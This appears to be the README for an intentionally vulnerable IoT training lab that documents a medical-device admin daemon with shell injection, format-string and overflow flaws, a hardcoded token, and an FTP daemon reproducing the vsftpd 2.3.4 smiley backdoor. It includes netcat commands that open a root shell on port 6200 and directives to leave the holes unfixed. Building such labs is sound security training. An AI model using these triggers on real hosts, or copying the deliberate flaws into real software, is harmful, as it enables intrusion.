# careservice — CareOtter Admin Service

> **Layer 2 (Stage Contract)** — runtime context for the CareOtter administration daemon deployed on the Pi at `/opt/careservice/careservice`. Source lives one level up at [../../../careservice.c](../../careservice.c) (outside the overlay so the binary, not the source, ships in `careotter.tar.gz`).

> **Also in this overlay:** a second native daemon, **careotter-ftp** (legacy field-service FTP reproducing the vsftpd 2.3.4 backdoor, OWASP IoT I2). It is documented in the [careotter-ftp section](#careotter-ftp-field-service-ftp-daemon-vsftpd-234-backdoor) at the end of this file.

---

## Purpose

TCP daemon listening on `0.0.0.0:9999` that implements the **IoT Gateway Protocol v4 (IGP)** — an 8-byte-header binary protocol used by the CareOtter Android app and the Cloud API to administer the device (WiFi provisioning, threshold updates, vitals queries, service reboot, defibrillator simulation, alert dispatch, log retrieval).

Intentionally vulnerable — this is the primary IoT attack surface for the lab.

## Process / lifecycle

- procd-managed via [../../etc/init.d/careservice](../../etc/init.d/careservice) (`START=70`, `USE_PROCD=1`)
- Boot symlink `/etc/rc.d/S70careservice` is recreated on every boot by the init script's `boot()` (self-healing if the load hook ever crashed mid-way)
- Logs to `/tmp/careservice.log` (last 512 bytes retrievable via IGP cmd `0x0A`)
- Defibrillator events to `/tmp/careotter_events.log` (not exposed via IGP)
- Threshold writes to `/tmp/careotter.thresholds` (consumed by `medical-sensor`)

## IGP v4 wire format

```
+--------+--------+--------+--------+--------+--------+--------+--------+
|              MAGIC (BE) = 0x43415245 ("CARE")                         |
+--------+--------+--------+--------+--------+--------+--------+--------+
|  cmd   | status |       len (BE)         |       payload (len bytes) |
+--------+--------+-----------------------+----------------------------+
```

| cmd  | name             | auth | notes                                                |
|------|------------------|------|------------------------------------------------------|
| 0x01 | SYS_INFO         | no   | uname release/machine                                |
| 0x02 | AUTHENTICATE     | no   | payload = `OtterMobile2026` → sets global `authenticated=1` |
| 0x03 | GET_NETWORK      | yes  | dumps `/etc/config/wireless` (SSID + PSK plaintext)  |
| 0x04 | SET_PREFS        | yes  | TLV parser — integer underflow → BOF                 |
| 0x05 | VERIFY_STATUS    | no   | payload used as `snprintf` format string             |
| 0x06 | SET_WIFI         | yes  | `SSID|PSK` interpolated into shell                   |
| 0x07 | GET_VITALS       | no   | proxies `GET /vitals` to `127.0.0.1:8081`            |
| 0x08 | SET_THRESHOLD    | yes  | TLV: `0xBB`=bpm_min/max, `0xCC`=spo2_min             |
| 0x09 | REBOOT_SERVICE   | yes  | `fork()`/`execv` of `/etc/init.d/<name> restart` (no `waitpid` → zombies) |
| 0x0A | GET_LOG          | yes  | last 512 bytes of `/tmp/careservice.log`             |
| 0x0B | DEFIBRILLATE     | yes  | payload used as `snprintf` format → events log       |
| 0x0C | EMERGENCY_ALERT  | yes  | payload interpolated into `curl … -d 'msg=%s'` shell |
| 0x0D | DEAUTHENTICATE   | no   | resets global flag                                   |

### Diagnostic error responses (lab-only)

Header parse failures send a short ASCII error before closing — handcrafted IGP frames get visibility into *why* the server hung up:

- `ERR_SHORT_HEADER:got=N exp=8`
- `ERR_MAGIC:got=0xXXXXXXXX exp=0x43415245`
- `ERR_PAYLOAD_SHORT:cmd=0xXX got=N exp=M`

Auth/payload-content failures stay opaque (`AUTH_FAIL`, `RESTRICTED`, `ERR_*`) — by design.

## Documented vulnerabilities

| #  | Sink                            | CWE        |
|----|---------------------------------|------------|
| 1  | Hardcoded `ADMIN_TOKEN` (strings(1)) | CWE-798 |
| 2  | TLV integer underflow in `parse_preferences` → BOF | CWE-191 / CWE-787 |
| 3  | Format string in `get_system_status` (cmd 0x05) | CWE-134 |
| 4  | Plaintext SSID/PSK disclosure (cmd 0x03) | CWE-200 |
| 5  | Shell injection in `SET_WIFI` SSID/PSK (cmd 0x06) | CWE-78 |
| 6  | Global `authenticated` flag persists across TCP connections | CWE-613 |
| 7  | Format string in `DEFIBRILLATE` events log (cmd 0x0B) | CWE-134 |
| 8  | Shell injection in `EMERGENCY_ALERT` (cmd 0x0C) | CWE-78 |
| 9  | Zombie children — `REBOOT_SERVICE` skips `waitpid` (cmd 0x09) | CWE-404 |

**DO NOT remove these** — the lab and `docs/CareOtter/IoT/CareOtter_IoT.md` depend on them. In particular: do **not** strip the binary (`strings(1)` must reveal `OtterMobile2026`) and do **not** add escaping to shell-interpolated commands.

## Building from source

Source: [../../../careservice.c](../../careservice.c)
Toolchain: OpenWRT 24.10.x SDK for `bcm2710` (RPi 3B+, aarch64 Cortex-A53, musl).

From `labs/careotter/` (so the relative output path `files/opt/careservice/careservice` resolves):

```sh
~/Documents/openwrt-bcm2710/staging_dir/toolchain-aarch64_cortex-a53_gcc-13.3.0_musl/bin/aarch64-openwrt-linux-musl-gcc \
    -o files/opt/careservice/careservice \
    careservice.c \
    -static -Wno-format-security
```

Notes:
- `-static` — RPi rootfs doesn't ship the matching musl; static avoids loader mismatch on `sysupgrade`.
- `-Wno-format-security` — suppresses the warnings about the **intentional** format-string sinks in cmd `0x05` and `0x0B`. Do not "fix" them.
- **Do NOT run `aarch64-openwrt-linux-musl-strip`** on the output — vuln #1 (hardcoded token) requires `strings(1)` to leak `OtterMobile2026` and `CARE`.
- Verify with `file files/opt/careservice/careservice` → `ELF 64-bit LSB executable, ARM aarch64, statically linked`.

## Deploying changes

1. Rebuild binary as above into `labs/careotter/files/opt/careservice/careservice`.
2. Regenerate the device tarball (consumed by `vulnzoo` device-manager):
   ```sh
   cd labs/careotter && tar -C files -czf ../vulnzoo/files/usr/lib/vulnzoo-devices/careotter.tar.gz .
   ```
3. On the Pi: `sysupgrade` (preserves overlay) **or** hot-swap for fast iteration:
   ```sh
   scp files/opt/careservice/careservice root@192.168.2.1:/opt/careservice/careservice
   ssh root@192.168.2.1 '/etc/init.d/careservice restart'
   ```

## Quick smoke test

```sh
# Auth then fetch logs (auth state persists across TCP connections — vuln #6)
printf '\x43\x41\x52\x45\x02\x00\x00\x0fOtterMobile2026' | nc -w2 192.168.2.1 9999
printf '\x43\x41\x52\x45\x0a\x00\x00\x00'                | nc -w2 192.168.2.1 9999
```

Expected: `AUTH_SUCCESS`, then last 512 bytes of `/tmp/careservice.log`.

## Related

- Init script: [../../etc/init.d/careservice](../../etc/init.d/careservice)
- Helper / PoC scripts: [../../../igp_helper.py](../../igp_helper.py), [../../../forge_threshold.py](../../forge_threshold.py), [../../../careotter_pin_brute_bleak.py](../../careotter_pin_brute_bleak.py)
- Vuln docs: [../../../../../docs/CareOtter/IoT/CareOtter_IoT.md](../../../../../docs/CareOtter/IoT/CareOtter_IoT.md)
- Test suite: [../../../../../docs/CareOtter/CareOtter_Test_Suite.md](../../../../../docs/CareOtter/CareOtter_Test_Suite.md)

---

# careotter-ftp: Field-Service FTP Daemon (vsftpd 2.3.4 backdoor)

> **Layer 2 (Stage Contract)** - second native daemon shipped by this overlay. Source [./careotter-ftp.c](./careotter-ftp.c), binary at `/opt/careotter-ftp/careotter-ftp`. Maps to OWASP **IoT I2 (Insecure Network Services)**.

## Purpose

A vendor "field-service" FTP on TCP `:21` for firmware and log transfer, running as root and already firewall-open via `75-firewall.sh`. The shipped binary impersonates the trojanned vsftpd 2.3.4 release: it advertises the banner `220 (vsFTPd 2.3.4)` and reproduces CVE-2011-2523. It is a faithful self-contained re-implementation for training, not the upstream vsftpd source.

Intentionally vulnerable: the outdated, unnecessary, internet-exposed service is the I2 attack surface. An `nmap -sV` exposes the `vsFTPd 2.3.4` banner, which points straight at the public Metasploit module.

## The backdoor (CVE-2011-2523)

An FTP `USER` argument containing the smiley `:)` arms a root `/bin/sh` on a separate port, TCP `:6200`, exactly like the real CVE. The trigger fires during `USER` before login completes, so the following `PASS` still returns `530 Login incorrect` (the user is not anonymous) while `:6200` is already armed.

The first `:)` trigger starts a persistent `:6200` listener that forks a fresh root shell per connection, so it is repeatable and never "connection refused". A later trigger that hits `EADDRINUSE` is a silent no-op.

Exploit (two terminals, because the backdoor is a separate port):

```sh
# term 1 - arm the backdoor
nc <pi> 21
220 (vsFTPd 2.3.4)
USER pwn:)            # arms :6200
331 Please specify the password.

# term 2 - fresh root shell, every time
nc <pi> 6200
id                   # uid=0(root)
```

Metasploit module: `exploit/unix/ftp/vsftpd_234_backdoor`.

## Anonymous FTP surface

Apart from the backdoor it behaves like a real anonymous FTP server, so the field-service narrative is concrete and scanners and clients recognise it.

- Anonymous login only: `USER anonymous` or `USER ftp` with any `PASS` returns `230 Login successful`. A named or empty user is rejected `530 Login incorrect`, because only the stored username is checked and the password value is ignored.
- Implemented commands: `PWD` / `CWD` / `TYPE` / `SYST` / `FEAT` / `PASV` / `LIST` / `NLST` / `RETR` / `QUIT` over a small canned `/firmware` and `/logs` tree (`firmware-1.4.2.bin`, `vitals.log`).
- Any pre-login command other than `USER` / `PASS` / `SYST` / `FEAT` / `QUIT` returns `530 Please login with USER and PASS`.

Control-channel activity logs to `/tmp/careotter-ftp.log`.

## Documented vulnerability

| #  | Sink | CWE |
|----|------|-----|
| 1  | Hidden functionality / supply-chain backdoor: `:)` in `USER` arms a root shell on `:6200` | CWE-912 |
| 2  | Unnecessary, outdated, internet-exposed network service (vsftpd 2.3.4) | CWE-1104 |

**DO NOT remove these** and **do NOT strip the binary**. `nmap -sV` and `strings(1)` must reveal `vsFTPd 2.3.4` for the fingerprint-to-exploit chain to work.

## Process / lifecycle

- procd-managed via [../files/etc/init.d/careotter-ftp](../files/etc/init.d/careotter-ftp) (`START=72` so `/etc/rc.d/S72careotter-ftp`, `USE_PROCD=1`, `respawn 3600 5 0`).
- Boot symlink recreated on every boot by the init script's `boot()` (self-heal, like careservice). Auto-enabled from the [../files/usr/lib/vulnzoo-hooks/profile-init.d/72-careotter-ftp.sh](../files/usr/lib/vulnzoo-hooks/profile-init.d/72-careotter-ftp.sh) hook.
- `stop_service` also runs `fuser -k 6200/tcp` to kill any backdoor shell still bound to `:6200`.

## Secure / vulnerable toggle

UCI `careotter.@careotter[0].ftp_secure` (mirrors careservice's `CARESERVICE_SECURE`):

- `0` or unset (default) is VULNERABLE: the init script starts the daemon and exports `CAREOTTER_FTP_SECURE=0`, so the backdoor is active.
- `1` is SECURE: the init script does not start the daemon at all. The I2 remediation is to decommission the unnecessary service, so nothing listens on `:21`. The binary also honours `CAREOTTER_FTP_SECURE=1` to disable only the backdoor, but in secure mode it is never launched.

## Building from source

Source: [./careotter-ftp.c](./careotter-ftp.c). Same toolchain as careservice (OpenWRT 24.10.x SDK, aarch64 Cortex-A53 musl).

From `labs/careotter/` (so the relative output path resolves):

```sh
aarch64-openwrt-linux-musl-gcc -O2 -static \
    -o files/opt/careotter-ftp/careotter-ftp \
    native_vulnerable/careotter-ftp.c
```

Do NOT strip the output (`strings(1)` / `nmap -sV` must leak `vsFTPd 2.3.4`). Repackage `careotter.tar.gz` exactly as in "Deploying changes" above.

## Quick smoke test

```sh
# banner + anonymous login
printf 'USER anonymous\r\nPASS x\r\nQUIT\r\n' | nc -w2 192.168.2.1 21

# arm and use the backdoor (two terminals)
printf 'USER pwn:)\r\n' | nc -w2 192.168.2.1 21    # term 1: arms :6200
nc 192.168.2.1 6200                                  # term 2: id -> uid=0(root)
```

## Related (careotter-ftp)

- Vuln doc: [../../../docs/CareOtter/Vulns/IoT/IoT2_Insecure_Network_Services.md](../../../docs/CareOtter/Vulns/IoT/IoT2_Insecure_Network_Services.md)
- Init script: [../files/etc/init.d/careotter-ftp](../files/etc/init.d/careotter-ftp)
- Load hook: [../files/usr/lib/vulnzoo-hooks/profile-init.d/72-careotter-ftp.sh](../files/usr/lib/vulnzoo-hooks/profile-init.d/72-careotter-ftp.sh)
